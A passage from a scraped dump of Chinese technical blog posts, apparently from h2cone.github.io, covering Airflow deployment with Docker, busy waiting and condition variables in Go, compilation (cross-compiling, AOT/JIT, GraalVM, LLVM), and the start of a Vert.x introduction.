设置。应用程序是否也必须知道该目录的绝对路径？应用程序必须与 Airflow 运行在同一台服务器上？显然不是，只需要在应用程序与 DAGs 之间插入一个中间层。\n共享卷 假如在 Docker 中运行 Airflow，方便开发运维起见，DagAgent 理应在 Docker 中运行，但是 DagAgent 接收到 DAG 文件后应该写到哪里去？以 airflow/docker-compose.yaml 为例，创建了三个卷（Volume）：\n1 2 3 4 5 6 7 8 9  version:\u0026#39;3\u0026#39;x-airflow-common:...volumes:- ./dags:/opt/airflow/dags- ./logs:/opt/airflow/logs- ./plugins:/opt/airflow/plugins......  其中 DAG 目录的源地址是 ./dags（宿主机视角），而目的地是 /opt/airflow/dags（Docker 容器视角）；可喜可贺的是 Docker CLI 已经支持 Compose 命令，捣鼓 Docker 版 Airflow 也就不需要 docker-compose ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  % docker compose up -d [+] Running 8/8 ⠿ Network \u0026#34;airflow_default\u0026#34; Created 0.6s ⠿ Container airflow_redis_1 Started 1.6s ⠿ Container airflow_postgres_1 Started 1.4s ⠿ Container airflow_airflow-scheduler_1 Started 10.0s ⠿ Container airflow_airflow-init_1 Started 10.3s ⠿ Container airflow_airflow-worker_1 Started 10.5s ⠿ Container airflow_airflow-webserver_1 Started 7.8s ⠿ Container airflow_dagagent_1 Started 10.6s % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 122a8455e781 dagagent:latest \u0026#34;./dagagent\u0026#34; 16 minutes ago Up 16 minutes (healthy) 0.0.0.0:1323-\u0026gt;1323/tcp airflow_dagagent_1 8ab76a88a05a apache/airflow:2.0.2 \u0026#34;/usr/bin/dumb-init …\u0026#34; 16 minutes ago Up 16 minutes (healthy) 0.0.0.0:8889-\u0026gt;8080/tcp airflow_airflow-webserver_1 1d0e1b191ea0 apache/airflow:2.0.2 \u0026#34;/usr/bin/dumb-init …\u0026#34; 16 minutes ago Up 16 minutes 8080/tcp airflow_airflow-scheduler_1 a389b993a2c3 apache/airflow:2.0.2 \u0026#34;/usr/bin/dumb-init …\u0026#34; 16 minutes ago Up 16 minutes 8080/tcp airflow_airflow-worker_1 12015f9bc778 postgres:13 \u0026#34;docker-entrypoint.s…\u0026#34; 16 minutes ago Up 16 minutes (healthy) 5432/tcp airflow_postgres_1 e32501a14963 redis:latest \u0026#34;docker-entrypoint.s…\u0026#34; 16 minutes ago Up 16 minutes (healthy) 0.0.0.0:6379-\u0026gt;6379/tcp airflow_redis_1   当前主目录如下：\n1 2 3 4 5  . ├── dags ├── logs ├── plugins └── docker-compose.yaml   在宿主机上将 DAG 文件输入到 dags，运行在 Docker 中的 Airflow 可感知；Airflow 的 Docker 容器输出的文件在宿主机可观测。由于 DagAgent 容器化，它的文件 I/O 自然作用于容器文件系统，因此从 DagAgent 的角度来看，DAG 目录也是 /opt/airflow/dags；既然 Webserver、Scheduler、Worker 都引用了 airflow-common，DagAgent 服务配置中可以使用 volumes_from 共享 DAG 目录：\n1 2 3 4 5 6 7 8 9 10 11 12  ...dagagent:image:dagagent:latestports:- 1323:1323environment:AIRFLOW__CORE__DAGS_FOLDER:/opt/airflow/dags...volumes_from:- airflow-webserver:rw......  最小化镜像 DagAgent 仅仅是一个微小的服务，容器化 Java 程序的话通常过于重量级，不妨使用 Go 编写，详情可参考 dagagent。\n基于 Go 官方镜像构建应用程序镜像，直接了当的 Dockerfile 文件：\n1 2 3 4 5 6 7 8 9  FROMgolang:1.16WORKDIR/go/src/github.com/h2cone/dagagentCOPY . .RUN go get -d -v ./...RUN go install -v ./...CMD [\u0026#34;dagagent\u0026#34;]  构建名为 dagagent:straightforward 的镜像：\n1  % docker build -t dagagent:straightforward -f docker/Dockerfile-straightforward .   但是 dagagent:straightforward 实在是太大了！\n1 2 3 4 5 6  % docker image list REPOSITORY TAG IMAGE ID CREATED SIZE dagagent straightforward 149604a01e75 6 seconds ago 1.05GB redis latest 739b59b96069 2 weeks ago 105MB apache/airflow 2.0.2 d7a0ff8c98a9 2 weeks ago 871MB postgres 13 26c8bcd8b719 3 weeks ago 314MB   基础镜像是罪魁祸首？使用 golang:1.16-alpine 代替 golang:1.16：\n1 2 3 4 5 6 7 8 9  FROMgolang:1.16-alpineWORKDIR/go/src/github.com/h2cone/dagagentCOPY . .RUN go get -d -vRUN go install -vCMD [\u0026#34;dagagent\u0026#34;]  构建名为 dagagent:small 的镜像：\n1  % docker build -t dagagent:small -f docker/Dockerfile-small .   该镜像大小已经小于 1G，是否还能再精简？\n1 2 3 4 5 6 7  % docker image list REPOSITORY TAG IMAGE ID CREATED SIZE dagagent small 145b612b635e 5 seconds ago 485MB dagagent straightforward 149604a01e75 About a minute ago 1.05GB redis latest 739b59b96069 2 weeks ago 105MB apache/airflow 2.0.2 d7a0ff8c98a9 2 weeks ago 871MB postgres 13 26c8bcd8b719 3 weeks ago 314MB   分析一下以上两个镜像的组成，至少包含下载的依赖文件、应用程序的源文件、静态编译输出的可执行文件等。DagAgent 运行时只需要可执行文件与操作系统，故使用多阶段构建（multi-stage builds），将编译时与运行时分为两个阶段，运行时所需的可执行文件拷贝自编译时，最终只产出包含可执行文件与操作系统的镜像：\n1 2 3 4 5 6 7 8 9 10 11 12  FROMgolang:1.16-alpine3.12 AS builderWORKDIR/go/src/github.com/h2cone/dagagentCOPY . .RUN go build -vFROMalpine:3.12WORKDIR/rootCOPY --from=builder /go/src/github.com/h2cone/dagagent/dagagent .CMD [\u0026#34;./dagagent\u0026#34;]  构建名为 dagagent:min 的镜像：\n1  % docker build -t dagagent:min -f docker/Dockerfile-min .   该镜像大小已降低 94%：\n1 2 3 4 5 6 7 8  % docker image list REPOSITORY TAG IMAGE ID CREATED SIZE dagagent min 75dbfbb53d78 10 seconds ago 27.3MB dagagent small 145b612b635e 4 minutes ago 485MB dagagent straightforward 149604a01e75 5 minutes ago 1.05GB redis latest 739b59b96069 2 weeks ago 105MB apache/airflow 2.0.2 d7a0ff8c98a9 2 weeks ago 871MB postgres 13 26c8bcd8b719 3 weeks ago 314MB   加速构建 回头看 dagagent:straightforward，除了镜像过大，还有一个缺点，即下载依赖时（通常最耗时）无法命中缓存。只更新了 DagAgent 的源代码但不更新依赖，构建镜像时却需重新下载依赖。\n加速镜像构建首要方式是充分利用构建缓存（Leverage build cache）。Docker 镜像建立在一系列层之上，每一层表示 Dockerfile 中的一条指令的执行结果。假如不禁用缓存，Docker 执行每一条 Dockerfile 指令时先查找之前层的缓存，若命中（例如校验和相等），则不重新执行当前指令而是引用已存在的层。一般情况下，结果不易变的指令写在结果易变的指令之前的 Dockerfile 缓存利用率更高。\nDagAgent 源代码比依赖更易变，根据上文，先下载依赖后拷贝源代码：\n1 2 3 4 5 6 7 8 9 10 11 12  FROMgolang:1.16WORKDIR/go/src/github.com/h2cone/dagagentCOPY go.mod .COPY go.sum .RUN go mod download -xCOPY . .RUN go install -vCMD [\u0026#34;dagagent\u0026#34;]  结合上一节的“最小化镜像”，最终版本的 Dockerfile 如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  # syntax=docker/dockerfile:1FROMgolang:1.16-alpine3.12 AS builderENV GOPROXY=\u0026#34;https://goproxy.io,direct\u0026#34;WORKDIR/go/src/github.com/h2cone/dagagentCOPY go.mod .COPY go.sum .RUN go mod download -xCOPY . .RUN go build -vFROMalpine:3.12RUN apk add curlWORKDIR/rootCOPY --from=builder /go/src/github.com/h2cone/dagagent/dagagent .CMD [\u0026#34;./dagagent\u0026#34;]  构建名为 dagagent:latest 的镜像:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  % docker build -t dagagent -f docker/Dockerfile . [+] Building 36.5s (19/19) FINISHED =\u0026gt; [internal] load build definition from Dockerfile 0.0s =\u0026gt; =\u0026gt; transferring dockerfile: 37B 0.0s =\u0026gt; [internal] load .dockerignore 0.0s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; resolve image config for docker.io/docker/dockerfile:1 19.2s =\u0026gt; CACHED docker-image://docker.io/docker/dockerfile:1@sha256:e2a8561e419ab1ba6b2fe6cbdf49fd92b95912df1cf7d313c3e2230a333fdbcc 0.0s =\u0026gt; [internal] load metadata for docker.io/library/alpine:3.12 7.6s =\u0026gt; [internal] load metadata for docker.io/library/golang:1.16-alpine3.12 17.1s =\u0026gt; [builder 1/7] FROM docker.io/library/golang:1.16-alpine3.12@sha256:1636899c10870ab66c48d960a9df620f4f9e86a0c72fbacf36032d27404e7e6c 0.0s =\u0026gt; =\u0026gt; resolve docker.io/library/golang:1.16-alpine3.12@sha256:1636899c10870ab66c48d960a9df620f4f9e86a0c72fbacf36032d27404e7e6c 0.0s =\u0026gt; [stage-1 1/4] FROM docker.io/library/alpine:3.12@sha256:36553b10a4947067b9fbb7d532951066293a68eae893beba1d9235f7d11a20ad 0.0s =\u0026gt; [internal] load build context 0.0s =\u0026gt; =\u0026gt; transferring context: 6.42kB 0.0s =\u0026gt; CACHED [stage-1 2/4] RUN apk add curl 0.0s =\u0026gt; CACHED [stage-1 3/4] WORKDIR /root 0.0s =\u0026gt; CACHED [builder 2/7] WORKDIR /go/src/github.com/h2cone/dagagent 0.0s =\u0026gt; CACHED [builder 3/7] COPY go.mod . 0.0s =\u0026gt; CACHED [builder 4/7] COPY go.sum . 0.0s =\u0026gt; CACHED [builder 5/7] RUN go mod download -x 0.0s =\u0026gt; CACHED [builder 6/7] COPY . . 0.0s =\u0026gt; CACHED [builder 7/7] RUN go build -v 0.0s =\u0026gt; CACHED [stage-1 4/4] COPY --from=builder /go/src/github.com/h2cone/dagagent/dagagent . 0.0s =\u0026gt; exporting to image 0.0s =\u0026gt; =\u0026gt; exporting layers 0.0s =\u0026gt; =\u0026gt; writing image sha256:ad807e3e1bda89824e55db14088156f9d4e8dabce6d4e79af117eb533371e4dc 0.0s =\u0026gt; =\u0026gt; naming to docker.io/library/dagagent 0.0s   判断指令是否命中缓存可通过一个关键词——CACHED来判断。\n插件发现 当 Airflow 生态的现有的 Operators 不满足需求时，可以考虑自定义 Operator，例如要实现一个哨兵语句式的 HTTP Operator，又如要实现一个可以将额外配置参数或上游 Tasks 的返回值（传递机制是 XComs）组装成复杂请求参数的拓展 HTTP Operator。\n1 2 3 4 5 6 7 8 9 10  . ├── dags ├── logs ├── plugins │ └── operators │ ├── __init__.py │ ├── extended_http_operator.py │ ├── extended_http_sentinel.py │ └── simple_http_sentinel.py ├── docker-compose.yaml   实现了新的 Operator 之后，当前版本的 Airflow 能够发现类似上面 plugins/operators 目录下的自定义 Operator，技巧在于内容空白的 __init__.py，自定义 Operator 的导入语句如下：\n1 2 3  from operators.simple_http_sentinel import SimpleHttpSentinel from operators.extended_http_sentinel import ExtendedHttpSentinel from operators.extended_http_operator import ExtendedHttpOperator   状态同步 业务系统很可能需要知道一个 DAG 运行后的状态（成功或失败），DAG 构造器有成功/失败的回调函数类型的参数（on_success_callback/on_failure_callback），美中不足的是没有表示失败重试次数的参数，然而受到 Python Requests 的高级使用 - 超时，重试，钩子的启发，于是编写了 dag_callback 来提高回调更新状态的成功率。\n数据库代理 按照 Fine-tuning your Scheduler performance 调优 Airflow Scheduler 时，注意到下面这段话：\n Database connections and Database usage might become a problem as you want to increase performance and process more things in parallel. Airflow is known from being “database-connection hungry” - the more DAGs you have and the more you want to process in parallel, the more database connections will be opened. This is generally not a problem for MySQL as its model of handling connections is thread-based, but this might be a problem for Postgres, where connection handling is process-based. It is a general consensus that if you have even medium size Postgres-based Airflow installation, the best solution is to use PGBouncer as a proxy to your database. The Helm Chart for Apache Airflow supports PGBouncer out-of-the-box. For MsSQL we have not yet worked out the best practices as support for MsSQL is still experimental.\n 在我的测试中，部署了edoburu/docker-pgbouncer 后，Airflow 任务实例之间的延迟下降了 20% ~ 30%。\nDeferrable Operators 如果长时间运行的 Sensors 资源开销不容小觑（基于多进程模型），疑似拖慢其它 Operator，那么不妨考虑 Smart Sensors 或者 Deferrable Operators，后者提供了一种更灵活的方式来实现高效的长时间运行的 Sensor。\n尾声 更多编排引擎（orchestration engine）：\n  Cadence\n  Temporal\n   本文首发于 https://h2cone.github.io\n 参考资料   Airflow # Concepts\n  Airflow # Celery Executor\n  Airflow # Configuration Reference\n  Airflow # Ecosystem\n  Curated list of resources about Apache Airflow\n  Develop with Docker\n  ","date":"2021-05-01T18:12:03+08:00","permalink":"https://h2cone.github.io/2021/05/01/airflow_trick/","title":"Airflow 杂技"},{"content":"反面 上课期间看到一段模拟投票的程序，其中主协程（main goroutine）产生的若干子协程并发请求票与计票，主协程重复检查票数是否已达到预期。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  package main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) func main() { rand.Seed(time.Now().UnixNano()) total, err := strconv.Atoi(os.Args[1]) if err != nil { panic(err) } overHalf := total/2 + 1 count := 0 finished := 0 var mu sync.Mutex for i := 0; i \u0026lt; total; i++ { go func() { vote := requestVote() mu.Lock() defer mu.Unlock() if vote { count++ } finished++ }() } for count \u0026lt; overHalf \u0026amp;\u0026amp; finished \u0026lt; total { // ...  } fmt.Printf(\u0026#34;count: %d\\n\u0026#34;, count) fmt.Printf(\u0026#34;finished: %d\\n\u0026#34;, finished) fmt.Printf(\u0026#34;count \u0026gt;= overHalf: %t\\n\u0026#34;, count \u0026gt;= overHalf) } func requestVote() bool { time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond) return rand.Int()%2 == 0 }   由于若干子协程并发访问一些共享变量（count 和 finished），使用互斥锁（Mutex）可直截了当防止内存一致性错误。另一方面，主协程反复检查票数时对于 count 和 finished 只读，因此并不需要锁定与解锁？\n1 2 3  for count \u0026lt; overHalf \u0026amp;\u0026amp; finished \u0026lt; total { // ... }   Visual Studio Code 推荐的 Go 代码静态分析器—— go-staticcheck 对以上循环语句给出了以下提示：\n loop condition never changes or has a race condition (SA5002) go-staticcheck\n 竞态条件（race condition）是指事件的时序或次序的不确定性影响到程序的正确性时产生的缺陷。此处不确定性的典型事例是上下文切换、操作系统信号、多处理器上的内存操作、硬件中断等，一般来说，产生竞态条件的场景是并发。在模拟投票程序，主协程读共享变量与若干子协程写共享变量这两件事的次序具有不确定性（参见多线程·并发编程），但是该程序结果仍然符合预期，因为这些共享变量从主协程的角度来看只是只读的变量（仅判断条件为真后不做任何事情而是继续判断条件）；尽管主协程某时刻可能读到脏数据（脏读），但是在这之后总能读到最终值，因为 count/finished 的值只递增，而且 overHalf/total 的值不变。如果主协程对共享变量不仅读取而且写入，出于安全考虑应当使用同步（Synchronization），例如也使用互斥锁：\n1 2 3 4 5 6 7 8 9 10 11  for { mu.Lock() if count \u0026gt;= overHalf || finished \u0026gt;= total { break } mu.Unlock() } fmt.Printf(\u0026#34;count: %d\\n\u0026#34;, count) fmt.Printf(\u0026#34;finished: %d\\n\u0026#34;, finished) fmt.Printf(\u0026#34;count \u0026gt;= overHalf: %t\\n\u0026#34;, count \u0026gt;= overHalf) mu.Unlock()   不仅消灭了潜在的竞态条件，而且消灭了潜在的数据竞争（data race）。数据竞争发生在两个线程/协程并发访问相同变量并且至少一个访问是写入时。下面老套的程序（主协程将等待所有子协程完成计数任务后才汇报）比较容易捕获协程之间的数据竞争产生的 BUG。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  package main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;sync\u0026#34; ) func main() { total, err := strconv.Atoi(os.Args[1]) if err != nil { panic(err) } count := 0 var wg sync.WaitGroup for i := 0; i \u0026lt; total; i++ { wg.Add(1) go func() { defer wg.Done() count++ }() } wg.Wait() fmt.Printf(\u0026#34;count: %d\\n\u0026#34;, count) fmt.Printf(\u0026#34;count == total: %t\\n\u0026#34;, count == total) }   Go 官方提供了 Data Race Detector 用于探测协程之间的数据竞争，有利于人们排除并发引起的故障。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  % go run -race count.go 1000000 ================== WARNING: DATA RACE Read at 0x00c0001ba008 by goroutine 8: main.main.func1() /Users/cosimo/vscws/go-examples/condvar/count.go:22 +0x6c Previous write at 0x00c0001ba008 by goroutine 7: main.main.func1() /Users/cosimo/vscws/go-examples/condvar/count.go:22 +0x84 Goroutine 8 (running) created at: main.main() /Users/cosimo/vscws/go-examples/condvar/count.go:20 +0x184 Goroutine 7 (finished) created at: main.main() /Users/cosimo/vscws/go-examples/condvar/count.go:20 +0x184 ================== count: 999990 count == total: false Found 1 data race(s) exit status 66   以上只是借题发挥，与忙等（busy waiting）并无关系，忙等有时被称为自旋（spinning）。模拟投票程序中的主协程反复判断条件是在浪费 CPU 时间，静态分析器得出了类似的警告：\n this loop will spin, using 100%% CPU (SA5002) go-staticcheck\n 在大多数情况下，忙等被认为是反模式而应该避免，与其将 CPU 时间浪费在无用的活动上，不如用于执行其它任务。\n1 2 3  while (\u0026lt;condition\u0026gt;) { Thread.sleep(millis); }   即使是在循环体内睡眠，IntelliJ IDEA 也可能提醒道：\n Call to \u0026lsquo;Thread.sleep()\u0026rsquo; in a loop, probably busy-waiting\n 不过是五十步笑百步罢了。虽然调整睡眠时长能减少条件判断次数，但是反复唤醒的成本不容忽视，无法排除浪费 CPU 时间的嫌疑。\n条件变量 最少化线程/协程的 CPU 时间成本，干吗不用事件驱动范式指导编程呢？具体来说，模拟投票程序中的主协程只在票数可能已到预期的情况下判断条件（若干子协程对共享变量的写入完成后通知主协程）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  package main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) func main() { rand.Seed(time.Now().UnixNano()) total, err := strconv.Atoi(os.Args[1]) if err != nil { panic(err) } overHalf := total/2 + 1 count := 0 finished := 0 var mu sync.Mutex cond := sync.NewCond(\u0026amp;mu) for i := 0; i \u0026lt; total; i++ { go func() { vote := requestVote() mu.Lock() defer mu.Unlock() if vote { count++ } finished++ cond.Signal() }() } mu.Lock() for count \u0026lt; overHalf \u0026amp;\u0026amp; finished \u0026lt; total { cond.Wait() } fmt.Printf(\u0026#34;count: %d\\n\u0026#34;, count) fmt.Printf(\u0026#34;finished: %d\\n\u0026#34;, finished) fmt.Printf(\u0026#34;count \u0026gt;= overHalf: %t\\n\u0026#34;, count \u0026gt;= overHalf) mu.Unlock() } func requestVote() bool { time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond) return rand.Int()%2 == 0 }   条件变量（condition variable）是一种使线程/协程等待另一个线程/协程执行特定操作的机制，与互斥锁同属于同步原语（synchronization primitives）。\n不难发现条件变量是通过互斥锁来创建，而且在等待（Wait()）之前需要先锁定（Lock()）（Java 的 wait/notify 和 Condition 也有类似要求），为什么条件变量需要或者依赖互斥锁？\n  条件变量可能被并发访问，考虑将访问条件变量的代码移动到临界区（锁定的代码块）。\n  协程在临界区调用 cond.Wait() 时释放互斥锁（否则准备发送通知的协程一直锁定失败），即“暂停”。\n  协程在临界区调用 cond.Signal() 或 cond.Broadcast() 通知“暂停”的协程准备锁定；协程释放互斥锁后的某时刻，被通知的协程重获互斥锁成功后从 cond.Wait() 返回，即“恢复”（继续执行其余代码）。\n  烂尾 你准备好了吗？\n你准备好了吗？\n你准备好了吗？\n\u0026hellip;\u0026hellip;\n别再问了，准备好了就通知你。\n 本文首发于 https://h2cone.github.io\n 参考资料   Are “data races” and “race condition” actually the same thing in context of concurrent programming\n  Race Condition vs. Data Race\n  Why do pthreads’ condition variable functions require a mutex?\n  How To Avoid Busy Waiting\n  ","date":"2021-03-08T23:05:33+08:00","permalink":"https://h2cone.github.io/2021/03/08/busy_waiting/","title":"忙等"},{"content":"一次交叉编译体验 有一个项目使用高级编程语言创建原生进程（native process）来执行 Shell 脚本，其中有一段用于编辑特定配置文件的代码片段。\n1 2 3 4  for name in $names; do eval expr=\u0026#39;$\u0026#39;\u0026#34;$name\u0026#34; sed -i -e \u0026#34;s/\u0026lt;@${name}@\u0026gt;/${expr}/g\u0026#34; ${file%.*}.${component_instance} done   sed（stream editor）是一个用于过滤和转换文本的 Unix 程序。\n1 2  # 将 file.txt 中的 before 就地替换为 after sed -i -e \u0026#39;s/before/after/g\u0026#39; file.txt   用法还算简单，但是，如果 after 包含特殊字符，比如传递包含正则表达式的多行代码（想象一下 Logstash 配置），运行时将极有可能发生类似错误：unknown option to s'。如果要对特殊字符进行转义，这种方案不仅复杂还易错，甚至可能会修改“间接调用” Shell 脚本的应用程序代码。换个角度，sed 是否有更好的替代品？\n感谢使用 Rust 重写一切的开源软件作者们，sd 完全可以代替 sed，而且能识别特殊字符。\n1  sd before after file.txt   兴致勃勃从 releases 下载可执行文件，却遇到因为开发/测试环境的 glibc 版本不符合 sd 的要求从而导致无法正常执行。\n1 2  $ ./sd-v0.7.6-x86_64-unknown-linux-musl --help ./sd-v0.7.6-x86_64-unknown-linux-musl: /lib64/libc.so.6: version `GLIBC_2.18\u0026#39; not found (required by ./sd-v0.7.6-x86_64-unknown-linux-musl)   升级 glibc 有一定风险，管理员不一定允许升级，而且客户/用户也不一定允许在线安装 sd。理想情况下，只需要提前在本地将 sd 源代码编译成目标服务器的可执行代码，那么目标服务器就无需安装 Rust 或其它东西了。得益于 Cross-compile and link a static binary on macOS for Linux with cargo and rust，成功在 macOS Big Sur 上将 sd 源代码编译成开发/测试环境的可执行文件。\n1 2  $ file sd sd: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped   所谓交叉编译，即将源文件从运行编译器的平台生成可在其它平台执行的文件。除了 Rust 天然支持交叉编译 ，其它主流语言做得到吗？Go 开箱即支持交叉编译。\nAOT 和 JIT Java 就麻烦得多了。Oracle Java 编译器（javac）并不能将 Java 源代码（Source Code）编译成原生可执行代码，而只能编译成 Java 字节码（Bytecode）。\nJava 字节码通常与平台无关（platform-independent），由 Java 虚拟机的解释器（Bytecode Interpreter）执行（如果有的话）。很久很久以前，Sun 用“编写一次，到处运行”的口号来说明 Java 的跨平台优势，Java 跨平台是因为 Java 虚拟机不跨平台，不同的平台安装不同的 Java 虚拟机才可能运行相同的 Java 程序（不同平台的 Java 字节码解释器可以执行相同的字节码）。\n当 Java 字节码由解释器执行时，总是比编译为原生机器码的同一程序执行慢。JIT 编译器（JIT Compiler）专门缓解此问题，JIT 编译器通常在运行时将 Java 字节码编译成原生机器码（Native/Machine Code），又称动态编译。相对地说，静态编译又名 AOT 编译（Ahead-of-time compilation），AOT 编译器的编译过程（从源代码到原生机器码）发生在程序运行之前。\n1 2 3 4 5 6  #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;hello, world\\n\u0026#34;); }   一个表面上非常简单的 C 语言程序（hello.c），使用 GCC 编译后输出可执行的目标程序（hello），这个过程包括了 AOT 编译。\n1  % gcc -o hello hello.c   可执行至少意味着可通过 ./ 执行。\n1 2  % ./hello hello, world   发生了什么事？了解编译系统如何工作，对将来优化程序性能有益处。\n（深入理解计算机系统（原书第3版）1.2 程序被其他程序翻译成不同的格式）\n1 2  % file hello hello: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dd72445243a497f2f62a1e5d19185ca41181e4b5, not stripped   JIT 编译器通常在预热（warmup）期工作，虽然 Java 程序启动速度会受到影响，但是方法调用（Method Invocation）发生时，Java 虚拟机将通过分析数据（Profiling）积极应用优化。例如，将调用次数已达阈值的方法（热点代码）编译成原生机器码并写入代码缓存（Code Cache），代码缓存的容量可以通过选项 -XX:ReservedCodeCacheSize 设置；将来调用同一方法时，不是解释执行（基于 Stack Machine），而是从缓存读取原生机器码直接执行（基于 Register Machine）。\n在生成原生机器码之前，JIT 编译器会先积极优化字节码。例如，方法内联（Method Inlining）、逃逸分析（Escape Analysis）、循环展开（Loop unrolling）、锁粗化（Lock Coarsening）、锁清除（Lock Elision） 等等。\n由于 Java 虚拟机隐藏了操作系统具体实现的复杂性，并给应用程序提供了简单或统一的接口，随着 Java 虚拟机的迭代升级，即使运行同一程序，也能实现更高的性能。Oracle 的 Java 默认虚拟机是 HotSpot JVM，HotSpot JVM 用 C++ 编写而成，它有两个 JIT 编译器，C1 和 C2。\nC1 适用于 Client（java –client），启动快，但峰值性能受损；C2 适用于 Server（java –server），非常适合编译热点方法，但启动慢（热身）。权衡利弊的结果可能是组合使用 C1 和 C2，Java 8 后默认开启多层编译（-XX:+TieredCompilation），先以 C1 编译，采样足够后以 C2 编译。\n所谓的 JVM 性能调优，通常聚焦在内存与 GC，若不考虑应用程序可能包含低效的部分，那不妨调参（选项或标记） 之后测试是否符合预期。真遇到了需要监视 JIT 的场景，换言之是为了性能优化或故障排查的目的分析 JIT 日志，发觉日志难读，但好在发现一款 JIT 日志分析与可视化工具——jitwatch。\nGraalVM 和 LLVM 退一步来说，借助虚拟机可以在编译时将 Java 程序编译成可执行文件。Oracle 的 GraalVM 的附加组件包括了一种将 Java 应用程序 AOT 编译为原生可执行文件的技术，名为 Native Image。\n GraalVM 是用于运行以 JavaScript、Python、Ruby、R、基于 JVM 的语言（例如 Java、Scala，Clojure，Kotlin）、基于 LLVM 的语言（例如 C 和 C ++）编写的应用程序的通用虚拟机。\n GraalVM Native Image 技术存在不容忽视的限制，原因之一是 AOT 编译参考的静态信息有时是不够的，并且很难猜测应用程序的实际行为。为了能够构建高度优化的原生可执行文件，GraalVM 会运行积极的静态分析，在编译时必须知道所有可访问的类和字节码，否则 Java 的动态特性（例如动态类加载、反射、动态代理等等）严重受限，甚至不可用。因此，GraalVM Native Image 兼容和优化指南建议用户编写配置文件“提示” GraalVM 做正确的事情。\nGraalVM Native Image 暂不支持交叉编译，但不意味不能在一个平台构建出其它平台的可执行文件。运用 操作系统级别的虚拟化即可，例如在本地下载各个平台的 GraalVM Docker 镜像，以此为基础构建可执行文件的镜像。\nGraalVM 之所以能运行不同种类的语言编写而成的应用程序的原因之一是 GraalVM 的核心组件与附加组件包含了多种运行时（Runtime）。比如运行 Java、JavaScript/Node.js、C/C++ 程序所需的环境：\n Java HotSpot VM Node.js JavaScript runtime LLVM runtime   LLVM 是模块化和可重用的编译器与工具链技术的集合。\n LLVM 不是通用虚拟机（VM），但使用 LLVM 的编程语言非常之多（从LLVM 的维基百科词条第二段可以体会到）。\nLLVM 编译器通常分为三部分：前端（frond-end）、中端（middle-end）、后端（back-end）。\n 前端：将源码编译为 IR。 中端：优化 IR。 后端：将 IR 编译为机器码。  IR 是中间表示（Intermediate representation）的简称，它是一种与平台无关（platform-independent）的代码/指令。\n1  % clang-11 hello.c -o hello   例如，使用 Clang 编译简单的 C 语言程序（hello.c），最终得到其可执行文件（hello，如果想观看 LLVM IR 的模样，不妨试试在浏览器编译 C 语言程序）。\n1 2  % file hello hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bf54bb50604533e477e6e42d576c573f88f2a986, not stripped   当我们想创建新的编程语言时，可以不必花费时间和精力去重新发明那些特定的轮子（例如用于编译与优化的工具），而是直接使用 LLVM 实现语言。\n从编译时开始重用 程序员们日常使用的各种库（Library）或框架（Framework）总是从编译时开始重用（Reuse），那时，彷佛站在了巨人的肩膀上。\n 本文首发于 https://h2cone.github.io\n 参考资料   Wiki # Ahead-of-time compilation\n  Wiki # Just-in-time compilation\n  JVM JIT-compiler overview\n  基本功 | Java即时编译器原理解析及实践\n  The Java HotSpot VM Under the Hood\n  The Java programming language Compiler Group\n  Wiki # Java performance\n  What is LLVM? The power behind Swift, Rust, Clang, and more\n  LLVM IR and Go\n  ","date":"2021-01-22T10:20:35+08:00","permalink":"https://h2cone.github.io/2021/01/22/some_things_about_compilation/","title":"编译的一些事"},{"content":"前面的话 有一个项目使用了 Vert.x 3，没想到 v4.0.0 已经发布。\n什么是 Vert.x Vert.x 是用于在 JVM 上构建 Reactive 应用程序的工具包。\n早在 2014 年反应式宣言就提出反应式（Reactive）应用程序/软件系统应具有反应灵敏（Responsive）、回弹性（Resilient）、弹性（Elastic）、消息驱动（Message Driven）等特征，这些莫名其妙的要求可以归属于前文常常提到的软件系统三大目标。\nVert.x 受到了 Node.js 启发，推荐的编程范式是事件驱动，事件可以由软件、用户、系统产生或触发，处理事件的函数通常被称为 Event Handler。\n1 2 3 4 5 6 7 8 9 10 11  import io.vertx.core.AbstractVerticle; public class Server extends AbstractVerticle { public void start() { vertx.createHttpServer().requestHandler(req -\u0026gt; { req.response() .putHeader(\u0026#34;content-type\u0026#34;, \u0026#34;text/plain\u0026#34;) .end(\u0026#34;Hello from Vert.x!\u0026#34;); }).listen(8080); } }   如上所示，使用 Vert.x 编写一个简单的 HTTP Server，其中 requestHandler 方法传入了用于处理请求事件的 Handler，Handler 表现为回调函数，即 Call­back；其中 listen 方法是非阻塞方法，线程调用非阻塞方法不会被阻塞在该方法，而是继续执行其它代码；非阻塞函数有时被称为异步函数，返回值可以被称为异步结果，仅使用 Callback 